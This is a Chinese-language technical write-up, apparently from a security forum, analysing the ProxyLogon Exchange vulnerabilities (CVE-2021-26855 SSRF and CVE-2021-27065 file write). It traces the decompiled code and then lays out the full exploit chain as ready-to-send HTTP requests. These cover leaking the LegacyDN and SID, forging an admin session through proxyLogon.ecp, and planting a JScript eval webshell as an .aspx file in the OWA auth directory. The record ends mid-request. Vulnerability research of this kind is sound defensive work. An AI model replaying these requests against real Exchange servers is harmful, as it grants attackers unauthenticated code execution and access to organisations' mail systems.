Windows Exchange组件漏洞分析（一）：ProxyLogon
====================================

@\[toc\]  
![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-69e7f6eb830ef2b92ca5f54f33e29fc6addf2227.png)

[参考文章](https://www.anquanke.com/post/id/259902#h2-7)

漏洞组成：SSRF+RCE（CVE-2021-26855、CVE-2021-27065）

环境搭建
----

`windows server 2016` [下载地址](https://blog.futrime.com/zh-cn/p/windows-server-iso%E9%95%9C%E5%83%8F%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80/)

`windows server 2016`[虚拟机安装](https://www.bilibili.com/read/cv18446895?from=search)

`exchange 15.1.2106.2` [漏洞环境搭建](https://zhuanlan.zhihu.com/p/366536079)

其中CVE-2021–26855是一个SSRF，攻击者可以不经过任何类型的身份验证来利用此漏洞，只需要能够访问Exchange服务器即可；与此同时，CVE-2021–27065是一个任意文件写入漏洞，它需要登陆的管理员账号权限才能触发。因此，两者的结合可以造成未授权的webshell写入，属于非常高危的安全漏洞。

组件架构
----

Exchange不同版本的组件架构并不相同，但总体上可以将其分为核心的邮箱服务器角色（Mailbox Role）和可选的边缘传输角色（Edge Transport Role）。

- Exchange作为边缘传输角色时部署在内外网交界处，充当邮件安全网关

[![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-56a82ee91d94cc8aab3bd87e8b6d67657712b4b2.png)](https://hosch3n.github.io/img/proxylogon_a.png)

Exchange作为邮箱服务器角色时分为客户端访问服务（Client Access Services）和后端服务（Backend Services）部分，CAS负责校验用户身份并将请求反代至具体的后端服务。

[![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-9b097d2a60035361effa3c78572b692347633f29.png)](https://hosch3n.github.io/img/proxylogon_b.png)

CAS对应IIS中的`Default Web Site`监听在80和443端口，BS对应IIS中的`Exchange Back End`监听在81和444端口。

[![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-a31f3f760792e97888bc438bd50cbac5e369fd01.png)](https://hosch3n.github.io/img/proxylogon_c.png)

出于解耦和兼容考虑，各个功能被封装为多个模块，有如下常用功能（缩写名对应URL访问路径）：

- OWA（Outlook Web App）
- ECP（Exchange Control Panel）
- EWS（Exchange Web Service）
- Autodiscover
- MAPI（Messaging Application Programming Interface）
- EAS（Exchange ActiveSync）
- OAB（Offline Address Books）
- PowerShell

CVE-2021-26855漏洞分析
------------------

漏洞poc

```http
POST /ecp/target.js HTTP/1.1
Host: localhost
Connection: close
Cookie: X-BEResource=[name]@win-v2jneuvoljv.test.com:443/autodiscover/autodiscover.xml?#~1941962753
Content-Type: text/xml
Content-Length: 337

<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
    <EMailAddress>Administrator@test.com</EMailAddress>
    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
```

正常的通过autodiscover读取配置信息的请求包。

```http
POST /autodiscover/autodiscover.xml HTTP/1.1
Host: 192.168.1.1
Content-Length: 351
Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHYAAACuAK4AjgAAABYAFgBAAAAACgAKAFYAAAAWABYAYAAAAAAAAAA8AQAABQKIoDEAOQAyAC4AMQA4ADgALgAxAC4AMQB0AGUAcwB0ADEAMQA5ADIALgAxADYAOAAuADEALgAxABlZOdtFpFcfJQY7ysotO0RJVlczdGVrae1Bq6PIhSQWZ5F4VJTTyL8BAQAAAAAAAOiYz4Q0XtYBSVZXM3Rla2kAAAAAAgAIAFQARQBTAFQAAQAGAEQAQwAxAAQAEABAAGUAcwB0AC5AYwBvAG0AAwAYAGQAYwAxAC5AdABlAHMAdAAuAGMAbwBtAAUAEAB0AGUAcwB0AC4AYwBvAG0ABwAIAOiYz3Q0XtYBCQAQAGMAaQBmAHMALwBEAEMAMQAAAAAAAAAAAA==
Content-type: text/xml
X-Anchormailbox: test1@test.com
X-Mapihttpcapability: 1
Accept-Encoding: gzip

<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
    <EMailAddress>Administrator@test.com</EMailAddress>
    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
```

poc中的几个问题

- 关于`/ecp/target.js`路由的问题，`target.js`是否是必须的。
- cookie中的`X-BEResource`字段是干什么用的，
- `X-BEResource`字段的值为何构造成了`[name]@win-v2jneuvoljv.test.com:443/autodiscover/autodiscover.xml?#~1941962753`这种形式。

漏洞存在于Microsoft.Exchange.FrontEndHttpProxy.dll中：

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-07e1f93465cb6f74567e3d1b5a2c1979703c8092.png)

applicationPool.MSExchangeECPAppPool是本次漏洞的相关进程.于是可以在dnspy中,点击调试-&gt;附加到进程-&gt;选中进程-&gt;附加。之后就可以下断点进行调试了。

### 漏洞分析

`Microsoft.Exchange.FrontEndHttpProxy`调试入口为 `Microsoft.Exchange.HttpProxy.ProxyModule`的`SelectHandlerForAuthenticatedRequest`方法

`BEResourceRequestHandler`是一个用于处理向后端进行资源型请求的类，如请求js，png，css文件等。它在函数`SelectHandlerForUnauthenticatedRequest`中被引用。

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-6b08a5598221d6b97c1223d614a58cdb09e59bfb.png)

然后可看到有三个if语句对不同的条件进行处理。

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-4248fb68c788d807b9f73bde1a0ba25c0084cc22.png)

在`IsEDiscoveryExportToolRequest`做了如下操作。判断`exporttool`是否会出现在url的绝对路径中，而我们请求路径中不能包含`exporttool`，然后返回false。

```csharp
        // Token: 0x0600157C RID: 5500 RVA: 0x0003C668 File Offset: 0x0003A868
        public static bool IsEDiscoveryExportToolRequest(HttpRequestBase request)
        {
            string absolutePath = request.Url.AbsolutePath;
            if (string.IsNullOrEmpty(absolutePath))
            {
                return false;
            }
            if (absolutePath.IndexOf("/exporttool/", StringComparison.OrdinalIgnoreCase) < 0)
            {
                return false;
            }
            EDiscoveryExportToolRequestPathHandler.EnsureRegexInit();
            return EDiscoveryExportToolRequestPathHandler.applicationPathRegex.IsMatch(absolutePath) || EDiscoveryExportToolRequestPathHandler.applicationCurrentPathRegex.IsMatch(absolutePath);
        }
```

最后一个if是判断`BEResourceRequestHandler.CanHandle(httpContext.Request)`

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-aac29ad0efab3c1e33ec10fd2d337995d6df9235.png)

在`CanHandle` 中可以发现需要满足两个条件

- HTTP请求的Cookie中含有X-BEResource键；
- 请求应是资源型请求，即请求的文件后缀应为规定的文件类型。

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-53a37e977d72a011ecf16b5f86e34c50dfe180a8.png)

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-6381a8c74f888bc416834dbd0d4f440418f0f068.png)

然后`httpHandler`会被设置为`BEResourceRequestHandler`的一个实例，由于`BEResourceRequestHandler`继承于`ProxyRequstHandler`，因此会进入`((ProxyRequestHandler)httpHandler).Run(context)`，并最终在`HttpContext.RemapHandler`中把该httpHandler设置给this.\_remapHandler，即是context.Handler。

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-053f0370633ea780ea47eee4a823b29641db3ce5.png)

然后会进行一些列函数调用

```php
Microsoft.Exchange.HttpProxy.ProxyRequestHandler 
-->BeginCalculateTargetBackEnd 
-->InternalBeginCalculateTargetBackEnd
-->BEResourceRequestHandler.ResolveAnchorMailbox
```

最终进入到漏洞函数`ResolveAnchorMailbox`。可以看到首先调用`GetBEResourceCookie`获取到Cookie中含有`X-BEResource`键的值  
![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-55a04fdd51ff98cfe2e5bab4e87056cae50e783c.png)

在判断 cookie中含有X-BEResource键的值不为空后，调用`FromString`处理。可以看到利用`~`来分割值，然后要求分割后的数组长度为2，也就是我们的cookie值中只含有一个`~`字符，并且`~`后面即为verison版本号，否则会报错。最后返回一个`BackEndServer`实例对象。

例如`X-BEResource=[name]@win-v2jneuvoljv.test.com:443/autodiscover/autodiscover.xml?#~1941962753`

经过处理后就为

```php
-array[0] = [name]@win-v2jneuvoljv.test.com:443/autodiscover/autodiscover.xml?#
version = array[1] = 1941962753
```

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-eb91dd67fcc05e77207329079cc829b218a42450.png)

分割后的结果是这样的。  
![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-dcb58b79de0f89cb1e26e950e6c530970fe279ae.png)

函数继续执行，下面经过一系列函数调用：后端服务器的目标FQDN()计算完后调用`OnCalculateTargetBackEndCompleted`函数。这里的fqdn就是`win-v2jneuvoljv.test.com`

```php
FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”）
例如：主机名是bigserver,域名是mycompany.com,那么FQDN就是bigserver.mycompany.com。 [1] 
```

`OnCalculateTargetBackEndCompleted`函数，该函数又调用`InternalOnCalculateTargetBackEndCompleted`函数  
![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-e5a2aae2a2923e5e953ae7490b8679465128abf9.png)

紧接着调用`BeginValidateBackendServerCacheOrProxyOrRecalculate`函数，  
![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-ba6aa6728459d8b80f305c54358ba4a0c4c2144b.png)

然后调用`BeginProxyRequestOrRecalculate`函数，  
![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-b75e25eb8e99158e2bfd8d448cf1220ef346fa35.png)

最终进入到`BeginProxyRequest`函数中调用`GetTargetBackendServerUrl`  
![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-cd5c03a96afa7c22d83799afd2f6863800d9c7ec.png)

`GetTargetBackendServerUrl`中将调用`GetClientUrlForProxy`函数构造发起请求的URL。这里有个关键点，如果版本大于`Server.E15MinVersion`，`ProxyToDownLevel`则为false，这个是一个重点之一，因为后续会判断`ProxyToDownLevel`是否为true，true的话就无法绕过身份验证。

第二个关键点就是`this.AnchoredRoutingTarget.BackEndServer.Fqdn;`该位置的值可控，那么result的值也可控。

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-9a311cb3e0021e6b14be2dc742c6508c3d9d61fc.png)

Server.E15MinVersion值

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-090424ff5c0672a0e61066c59b9e49f972e31987.png)

然后这段代码实例化了一个 UrlBuilder类，涉及三个关键属性，Scheme、Host 和 Port。Schema 被设置为https；Host 取自于 BackEndServer.Fqdn，看一下 Host.Set() :

可以看到在这个函数里面判断host第一个字符是否为`[`并且其中是否含有`:`，如果都满足就将其用`[]`包裹起来。

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-b2a33e622e3413c1a519eeecc470f89a9bb8e46f.png)

所以举个例子，如果我们设置为这样

```php
X-BEResource=@WIN-PDEITI81MJNQ.server.cd:443/autodiscover/autodiscover.xml?#~1941962753
```

最后赋值完的结果是这样的。

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-7dd55f4ced19134fdda8e974bdb35f35390057b5.png)

但在给Post字段赋值完后会自动进行重新解析，变成下面这样：

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-de81b8b7f2c839df493236dc5b427d88eef62469.png)

在将上面三个属性赋值后，该函数就返回了 clientUrlForProxy.Uri，查看Uri 的get方法:

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-7a6a8c99d4e6c3993e37f436369c9ecbd5b5b1ac.png)

调用了 UriBuilder.ToString() 方法来取得最终的 指向BackEnd 的目标url。在 ToString() 中对各个参数进行拼接，形成url。

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-aff8baef2ae87e596ab27e6778f8de94f297215b.png)

拼接完就是这样的

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-007515373dbf92c60bcef48052c47aba528db668.png)

最终在调用this.CreateServerRequest将uri发送给后端服务器

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-f3d86eac67aad08f4536415ed1d81e86766918b1.png)

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-5e4100efdce10d06dd776aab9db0dfce15b52466.png)

调用`this.PrepareServerRequest(httpWebRequest);`

进行身份认证。可以看到这里就判断了`ProxyToDownLevel`是否为true，为false会直接报错。  
![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-df6e05d069d633289557ec61561d0ac0e5564b4e.png)

调用 `GenerateKerberosAuthHeader()`函数来 创建Kerberos 认证头部。这也是中间代理能够访问BackEnd Server的原因 。  
![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-04587850f64f307102ed382e46af6409f5b11058.png)

ShouldBlockCurrentOAuthRequest函数里的ProxyToDownLevel是用来检查用户是否已通过身份验证；而当有请求调用BEResourceRequestHandler时，ShouldBackendRequestBeAnonymous()就会被调用。绕过认证，然后把数据包组成后发送给后端。后端响应请求，把数据返回给客户端。最后达到一个SSRF漏洞攻击的过程。

经过上面的分析，我们回答了一开始的问题:

/ecp/target.js 不是必须的，它可以是其他的路径 /ecp/xxxxxxxx.png

X-BEResource 用于代理请求，其原本格式应该是 \[fqdn\]~BackEndServerVersion

BackEndServerVersion 应该大于1941962752，‘#’ 用于在有url请求参数时分隔参数。

而且我们知道了X-BEResource 实际上完全不需要 `]` 去闭合中括号，我们完全可以直接用`[]`来将name 括起来，比如下面这样：

```php
[name]@win-v2jneuvoljv.test.com:443/autodiscover/autodiscover.xml?#~1941962753
```

CVE-2021–27065
--------------

漏洞成因

```php
Microsoft.Exchange.Management.DDIService.WriteFileActivity未校验写文件后缀，可由文件内容部分可控的相关功能写入WebShell。
```

`Microsoft.Exchange.Management.DDIService.WriteFileActivity`中有一处明显的补丁变动，使得文件后缀名只能为txt。  
![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-3e1ba0e7dda9f9e1ad958453995073158ed79df7.png)

在Exchange服务器上依次打开\[管理中心\] -&gt; \[服务器\] -&gt; \[虚拟目录\] -&gt; \[OAB虚拟目录\]。

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-80bd8fd183b0a8856be3aec744973e61aa4349fa.png)

在url中填入一句话木马。

```php
http://ffff/#<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],"unsafe");}</script>
```

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-5c5642f55028b92d29cc587c4c93b237c55e25fc.png)

查看请求包，使用的是`/ecp/DDI/DDIService.svc/SetObject`接口

```php
POST /ecp/DDI/DDIService.svc/SetObject?ActivityCorrelationID=30a0575a-5ee8-8b03-181a-ea1cdc1fb7b4&schema=OABVirtualDirectory&msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.
```

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-98ee1c36294a1d01b393d2d52e88d7570bcc68e0.png)

在重置位置，填入文件保存目录，然后重置。

```php
\\127.0.0.1\c$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\kkfine.aspx
```

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-772ddcccbd29f31a65cea6f21bd0052ad832e878.png)

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-091b37acee476a2ac285e34ee4585a4ccd4d9816.png)

查看请求包。请求中有一个关键参数`msExchEcpCanary`，如果没有这个参数，服务端返回500错误。这个参数的值可以利用CVE-2021-26855 SSRF漏洞通过多次请求获取。

可以看到第一个请求包是设置文件保存路径的请求包，使用的也是`/ecp/DDI/DDIService.svc/SetObject`接口，并且`msExchEcpCanary`和`ActivityCorrelationID`参数也是一样的。仔细观察其实就是请求包里面的字段`ExternalUrl`变为了`FilePathName`

```php
/ecp/DDI/DDIService.svc/SetObject?ActivityCorrelationID=30a0575a-5ee8-8b03-181a-ea1cdc1fb7b4&schema=OABVirtualDirectory&msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.
```

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-69c57289af8bd3ab60a14e69adae1f4ac25ec5da.png)

第二个是点击重置的请求包，使用的是`/ecp/DDI/DDIService.svc/GetList`接口

```php
 /ecp/DDI/DDIService.svc/GetList?ActivityCorrelationID=085910a4-27c2-5616-c475-1164aa5d54d6&schema=VirtualDirectory&msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.
```

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-dd1264c6a3449d9f7d38f953a77456357f96405e.png)

然后可以看到，靶机上已经能够看到上传的木马文件。

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-07d24f8a75437ae48d7d6c08775d0e6002456b2a.png)

重置完成，访问木马文件

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-ed045be4df63db8f0abaaf2c95a3e9298aeab4d0.png)

漏洞利用
----

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-6af1975ee35870f77c1443ae5279a8758916fa6c.png)

所以我们的攻击思路就是首先需要通过ssrf获取到域用户的cookie，然后通过文件上传来写马。

### 获取server name

```php
GET /ecp/target.js HTTP/1.1
Host: localhost
Connection: close
Cookie: X-BEResource=localhost/owa/auth/logon.aspx?~1941962753
Content-Type: text/xml
Content-Length: 0

```

利用500回显查看到`X-Feserver: WIN-V2JNEUVOLJV`中`server name`即为`WIN-V2JNEUVOLJV`

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-4dee8c2d2527889dd688e98ad90880a59f44750c.png)

### 获取域用户cookie

这里ssrf去访问`autodiscover.xml`自动配置文件的原因是因为Autodiscover(自动发现)是自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。如果用户账户是域账户且当前位于域环境中，通过自动发现功能用户无需输入任何凭证信息即可登陆邮箱。`autodiscover.xml`文件中包含有LegacyDN 的值

通过SSRF漏洞读取autodiscover.xml文件，获取LegacyDN的值；

```http
POST /ecp/target.js HTTP/1.1
Host: localhost
Connection: close
Cookie: X-BEResource=name]@win-v2jneuvoljv.test.com:443/autodiscover/autodiscover.xml?#~1941962753
Content-Type: text/xml
Content-Length: 337

<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
    <EMailAddress>Administrator@test.com</EMailAddress>
    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
```

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-de28ac7d80b9da79a23b8a900540d3f38ed30e40.png)

### 利用Legacy DN获取SID；

消息处理API（MAPI）是Outlook用于接收和发送电子邮件相关信息的API，在Exchange 2016以及2019当中，微软又为其加入了MAPI over HTTP机制，使得Exchange和Outlook可以在标准的HTTP协议模型之下利用MAPI进行通信。整个MAPI over HTTP的协议标准可以在[官方文档](https://interoperability.blob.core.windows.net/files/MS-OXCMAPIHTTP/%5BMS-OXCMAPIHTTP%5D.pdf)中查询。为了获取对应邮箱的SID，如下图所示的exploit中利用了用于发起一个新会话的Connect类型请求。

```http
POST /ecp/1.js HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: X-BEResource=a@win-v2jneuvoljv.test.com:444/mapi/emsmdb?~1941962754
Content-Type: application/mapi-http
X-Requesttype: Connect
X-Clientinfo: x
X-Clientapplication: Outlook/15.0.4815.1002
X-Requestid: x
Content-Length: 151

/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=cb4034a0f211454d89075d7b5f20cbfa-Admin+ \x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00
```

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-5af887ad25015549044a6eebb93b2a3877263225.png)

POST 请求格式为

```php
legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
```

一个正常的Connect类型请求如图所示，包含UserDn等多个字段，其中UserDn指的是用户在该域中的专有名称（Distinguish Name），该字段已被我们通过上一步骤的请求中得到。该Connect类型请求通过解析后会将相关参数交给Exchange RPC服务器中的EcDoConnectEx方法执行。由于发起请求的RPC客户端的权限为SYSTEM，对应的SID为S-1-5-18，与请求中给出的DN所对应的SID不匹配，于是响应中返回错误信息，该信息中包含了DN所对应的SID，从而达到了目的。

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-a989837119486f9654531c5f089208ba16e76761.png)

### 使用sid获取cookie

请求包

```php
POST /ecp/1.js HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: X-BEResource=Administrator@win-v2jneuvoljv.test.com:444/ecp/proxyLogon.ecp?#~1941962753
Content-Type: text/xml
Content-Length: 256
msExchLogonMailbox: S-1-5-18

<r at="Negotiate" ln="Administrator"><s>S-1-5-21-254742065-2746332885-3299130760-500</s><s a="7" 
    t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s 
    a="3221225479" t="1">S-1-5-5-0-6948923</s></r> 
```

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-e5063cc2caf72a26ebbea409eb53c12e2bb86397.png)

在该物理路径下的.NET应用配置文件`web.config`中定义了不同路径的HTTP请求对应的处理函数，检索可知路径`proxyLogon.ecp`是由`ProxyLogonHandler`来处理的，然而对相应的dll进行反编译后发现该`Handler`仅修改了HTTP响应的状态码。

![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-cb190828b7bc59aba543706d2acd55c751477196.png)

最终通过调试后发现，真正与`msExchEcpCanary`以及`ASP.NET_SessionId`相关的代码是在类`RbacModule`中的，通过`web.config`可以看到`RbacModule`作为应用的其中一个模块用于处理HTTP请求。

![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-e186324a0cd3670b9b6d44473e8d781f23193614.png)

在该模块中由函数`Application_PostAuthenticateRequest`具体实现对HTTP请求的解析。相关关键代码如下，首先函数根据`httpContext`生成`AuthenticationSettings`实例。

![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-a13a0a8a42a78885401fb378f9cdab344486472d.png)

在`AuthenticationSettings`的构造函数中，由于所有的if语句均不满足，函数会根据`context`生成一个`RbacSettings`实例，并赋值给自己的`Session`属性。

![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-33c12963cd68b2069eccd4443d746ae2e16c57cf.png)

而在`RbacSettings`的构造函数中，函数会判断请求路径是否以`/proxyLogon.ecp`结尾，若是则进入下方的if分支，利用请求数据创建`SerializedAccessToken`实例。

![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-7b3302c3aa2723667b1716826043fe5ad0831063.png)

分析`SerializedAccessToken`类，可知该类会将访问令牌序列化成XML格式，其中根节点的名字为`r`，根节点的`at`属性对应访问令牌中的认证类型、`ln`属性对应访问令牌中的登录名称；根节点的子节点为SID节点，节点名字为`s`，当中的属性`t`对应SID类型，属性`a`对应SID属性，节点中的文本为SID。其序列化函数定义如下，可以看到令牌大致与Windows中的安全访问令牌内容相似。

![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-afc3112a60790e6e925c06443d7019051ee1c515.png)

随后构造函数根据请求头部的`msExchLogonMailbox`字段以及`logonUserIdentity`变量调用`GetInboundProxyCaller`函数获取该代理请求的发起服务器。若返回结果不为空则调用`EcpLogonInformation.Create`函数创建一个`EcpLogonInformation`实例，再用该实例创建一个`EcpIdentity`实例。

![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-b60d9aa756948e7d8eb8a09924b955bbb9784abf.png)

`Create`函数首先根据`logonMailboxSddlSid`生成安全标识符实例，然后根据`proxySecurityAccessToken`参数生成`SerialzedIdentity`实例，并最后生成`EcpLogonInformation`实例。而根据名称可知`logonUserIdentity`定义了登入用户的权限，因而我们能够得到任意SID对应用户的权限。

![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-8908f8c772143a0969f9fdffed6505456c2172bd.png)

之后程序回到`RbacSettings`的构造函数中，在响应中添加`ASP.NET_SessionId`Cookie。

![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-0b7f146c93e4c5ce3b33043c227b790e983d58d5.png)

程序接下来返回到`RbacModule`的函数中，在`AuthenticationSettings`实例生成后其`Session`属性被赋值给`httpContext.User`，并进入if分支调用`CheckCanary`函数。

![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-5aafd829bbc65b4696e6392bcfddadb0d4d62567.png)

`CheckCanary`函数又将调用如下所示的`SendCanary`函数，该函数首先从请求的Cookie中读取Canary并尝试恢复，若成功则函数直接返回，否则生成一个新的Canary并将其加入到响应的Cookie中。从而我们能够构造满足要求的请求通过SSRF访问`ecp/proxyLogon.ecp`获得管理员的凭证。

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-c7259d17ce034039fa51c1c0b20f545bfc511c65.png)

### 文件上传

```http
POST /ecp/iey8.js HTTP/1.1
Host: 192.168.0.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: X-BEResource=@win-v2jneuvoljv.test.com:444/ecp/DDI/DDIService.svc/GetObject?schema=VirtualDirectory&msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.#~1; ASP.NET_SessionId=2c6b26f5-6662-4e85-a8cb-44e7851baea2; msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9o

\

IdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.
Content-Type: application/json; 
msExchLogonMailbox: S-1-5-20
Content-Length: 162

{"filter": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "SelectedView": "", "SelectedVDirType": "OAB"}}}

```

![](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-ec5a8c5b16c01bdea6722e3979e025fcd1df0f40.png)

![img](https://shs3.b.qianxin.com/attack_forum/2023/03/attach-cdc108b68ff56c288b9abb08d626826db4e92d20.png)

```http
POST /ecp/iey8.js HTTP/1.1
Host: 192.168.0.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: X-BEResource=@win-v2jneuvoljv.test.com:444/ecp/DDI/DDIService.svc/GetObject?schema=VirtualDirectory&msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.#~1; ASP.NET_SessionId=2c6b26f5-6662-4e85-a8cb-44e7851baea2; msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.
msExchLogonMailbox: S-1-5-20
Content-Type: application/json; charset=utf-8
Content-Length: 399

{"identity":{"__type":"Identity:ECP","DisplayName":"OAB (Default Web Site)","RawIdentity":"8bb65fea-5a07-4d88-ac1b-bc9de2740cd9"},"properties":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel","ExternalUrl":"http://ffff/#<script language=\"JScript\" runat=\"server\"> function Page_Load(){/**/eval(Request[\"code\"],\"unsafe\");}</script>"}}}
```

```http
POST /ecp/iey8.js HTTP/1.1
Host: 192.168.0.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: X-BEResource=@win-v2jneuvoljv.test.com:444/ecp/DDI/DDIService.svc/GetObject?schema=VirtualDirectory&msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.#~1; ASP.NET_SessionId=2c6b26f5-6662-4e85-a8cb-44e7851baea2; msExchEcpCanary=AQB_nzZ3TkaV7UmDQbbI4GBeZYlBt9oIdPNrql9tKVyzP6vDQRsOmEkxlP1NDQK1d5dAhz17bCI.
msExchLogonMailbox: S-1-5-20
Content-Type: application/json; charset=utf-8
Content-Length: 399

